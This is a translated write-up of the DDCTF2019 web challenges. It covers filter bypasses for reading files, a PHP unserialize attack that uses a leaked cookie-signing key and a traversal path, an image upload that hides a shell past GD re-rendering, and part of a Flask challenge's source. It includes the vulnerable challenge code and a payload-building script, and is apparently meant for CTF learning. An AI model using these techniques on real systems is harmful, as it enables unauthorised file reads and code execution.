# DDCTF2019官方Write Up——Web篇
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x01：滴~
题目链接：http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09
首页是是一张图片
结合jpg参数怀疑存在文件包含漏洞，其加密方法是先ascii hex再经过两次base64
知道加密方法后可以读index.php文件
    '.$_GET['jpg'].'';
    $file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
    echo $file.'';
    $file = str_replace("config","!", $file);
    echo $file.'';
    $txt = base64_encode(file_get_contents($file));
    echo "";
    /*
     * Can you find the flag file?
     *
     */
    ?>
网上搜代码可以发现这和之前[某春秋的题目](https://blog.csdn.net/qq_30435981/article/details/81268542)非常类似，diff一下出题点应该在https://blog.csdn.net/FengBanLiuYun/article/details/80616607
根据提示的日期Date: July 4,2018可以找到对应的博文
这里卡了好久各种试已知路径的swp文件，最后发现访问http://117.51.150.26/practice.txt.swp有反应，提示了flag文件位置。
因为index.php中把解码后的文件名用以下正则做了过滤，不允许有了除了.之外的特殊符号而flag文件中含有!所以无法直接阅读文件内容。
    $file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
不过这段在进行正则过滤后又进行了二次过滤代码如下，恰巧又是用!，所以可以用文件名flagconfigddctf.php绕过
    $file = str_replace("config","!", $file);
接着读flag!ddctf.php
extract($_GET);这里有一个明显的变量覆盖漏洞，把k覆盖成vps地址，uid参数与vps地址内容保持相同即可，如图
## 0x02：WEB 签到题
题目链接：http://117.51.158.44/index.php
直接登陆会提示权限不够
抓包分析可以看到有个明显的header头didictf_username
把它改成admin即可正常访问
访问可以拿到两个php文件源码
url:app/Application.php
    Class Application {
        var $path = '';
        public function response($data, $errMsg = 'success') {
            $ret = ['errMsg' => $errMsg,
                'data' => $data];
            $ret = json_encode($ret);
            header('Content-type: application/json');
            echo $ret;
        }
        public function auth() {
            $DIDICTF_ADMIN = 'admin';
            if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {
                $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');
                return TRUE;
            }else{
                $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error');
                exit();
            }
        }
        private function sanitizepath($path) {
        $path = trim($path);
        $path=str_replace('../','',$path);
        $path=str_replace('..\\','',$path);
        return $path;
    }
    public function __destruct() {
        if(empty($this->path)) {
            exit();
        }else{
            $path = $this->sanitizepath($this->path);
            if(strlen($path) !== 18) {
                exit();
            }
            $this->response($data=file_get_contents($path),'Congratulations');
        }
        exit();
    }
    }
url:app/Session.php
    include 'Application.php';
    class Session extends Application {
        //key建议为8位字符串
        var $eancrykey                  = '';
        var $cookie_expiration          = 7200;
        var $cookie_name                = 'ddctf_id';
        var $cookie_path            = '';
        var $cookie_domain              = '';
        var $cookie_secure              = FALSE;
        var $activity                   = "DiDiCTF";
        public function index()
        {
        if(parent::auth()) {
                $this->get_key();
                if($this->session_read()) {
                    $data = 'DiDI Welcome you %s';
                    $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']);
                    parent::response($data,'sucess');
                }else{
                    $this->session_create();
                    $data = 'DiDI Welcome you';
                    parent::response($data,'sucess');
                }
            }
        }
        private function get_key() {
            //eancrykey  and flag under the folder
            $this->eancrykey =  file_get_contents('../config/key.txt');
        }
        public function session_read() {
            if(empty($_COOKIE)) {
            return FALSE;
            }
            $session = $_COOKIE[$this->cookie_name];
            if(!isset($session)) {
                parent::response("session not found",'error');
                return FALSE;
            }
            $hash = substr($session,strlen($session)-32);
            $session = substr($session,0,strlen($session)-32);
            if($hash !== md5($this->eancrykey.$session)) {
                parent::response("the cookie data not match",'error');
                return FALSE;
            }
            $session = unserialize($session);
            if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){
                return FALSE;
            }
            if(!empty($_POST["nickname"])) {
                $arr = array($_POST["nickname"],$this->eancrykey);
                $data = "Welcome my friend %s";
                foreach ($arr as $k => $v) {
                    $data = sprintf($data,$v);
                }
                parent::response($data,"Welcome");
            }
            if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) {
                parent::response('the ip addree not match'.'error');
                return FALSE;
            }
            if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {
                parent::response('the user agent not match','error');
                return FALSE;
            }
            return TRUE;
        }
        private function session_create() {
            $sessionid = '';
            while(strlen($sessionid)  md5(uniqid($sessionid,TRUE)),
                'ip_address' => $_SERVER['REMOTE_ADDR'],
                'user_agent' => $_SERVER['HTTP_USER_AGENT'],
                'user_data' => '',
            );
            $cookiedata = serialize($userdata);
            $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);
            $expire = $this->cookie_expiration + time();
            setcookie(
                $this->cookie_name,
                $cookiedata,
                $expire,
                $this->cookie_path,
                $this->cookie_domain,
                $this->cookie_secure
                );
        }
    }
    $ddctf = new Session();
    $ddctf->index();
主要的逻辑点在session_read和session_create上，session_create会对一个数组的类型的数据进行序列化并签名，session_read会根据签名验证序列化的数据是否被篡改，如果没有被篡改那么就进行反序列化。显然这是一道考察反序列化知识点的题目，可利用的魔术方法是Application.php中的__destruct，这个类对应的对象在析构的时候会去文件内容并返回。
唯一需要解决的问题是如何拿到eancrykey,代码中和key操作相关的是session_read这一段
    if(!empty($_POST["nickname"])) {
                $arr = array($_POST["nickname"],$this->eancrykey);
                $data = "Welcome my friend %s";
                foreach ($arr as $k => $v) {
                    $data = sprintf($data,$v);
                }
                parent::response($data,"Welcome");
            }
这里把eancrykey也带入了循环，所以只要nickname中有%s即可读出，具体操作如下
有了eancrykey就可以随便签名了，下面是最终payload
    path = "..././config/flag.txt";
    $userdata = array(
        'session_id' => md5(uniqid($sessionid,TRUE)),
        'ip_address' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'user_data' => '',
        'flag' => $poc,
    );
    $cookiedata = serialize($userdata);
    $cookiedata = $cookiedata.md5($eancrykey.$cookiedata);
    echo "-----------------------------------------------\n";
    var_dump($cookiedata);
## 0x03：Upload-IMG
题目链接：http://117.51.148.166/upload.php 上传图片再去访问图片可以发现文件头有php
gd的字样，结合题意（处理后的图片中要有phpinfo字样）猜测考的是PHP GD库二次渲染绕过，网上已经有很多相关文章。
工具在https://wiki.ioin.in/soft/detail/1q可以下载 经验就是 1、图片找的稍微大一点 成功率更高
2、shell语句越短成功率越高 3、一张图片不行就换一张 不要死磕 4、可以把gd处理的图片再用工具跑一遍再传 5、看脸
搞了几个小时之后出flag了。。。
## 0x04：homebrew event loop
题目链接：http://116.85.48.107:5002/d5af31f88147e857/
题目源码
    Download this .py file
    Go back to index.html
    # -*- encoding: utf-8 -*- 
    # written in python 2.7 
    __author__ = 'garzon' 
    from flask import Flask, session, request, Response 
    import urllib 
    app = Flask(__name__) 
    app.secret_key = '*********************' # censored 
    url_prefix = '/d5af31f88147e857' 
    def FLAG(): 
        return 'FLAG_is_here_but_i_wont_show_you'  # censored 
    def trigger_event(event): 
        session['log'].append(event) 
        if len(session['log']) > 5: session['log'] = session['log'][-5:] 
        if type(event) == type([]): 
            request.event_queue += event 
        else: 
            request.event_queue.append(event) 
    def get_mid_str(haystack, prefix, postfix=None): 
        haystack = haystack[haystack.find(prefix)+len(prefix):] 
        if postfix is not None: 
            haystack = haystack[:haystack.find(postfix)] 
        return haystack 
    class RollBackException: pass 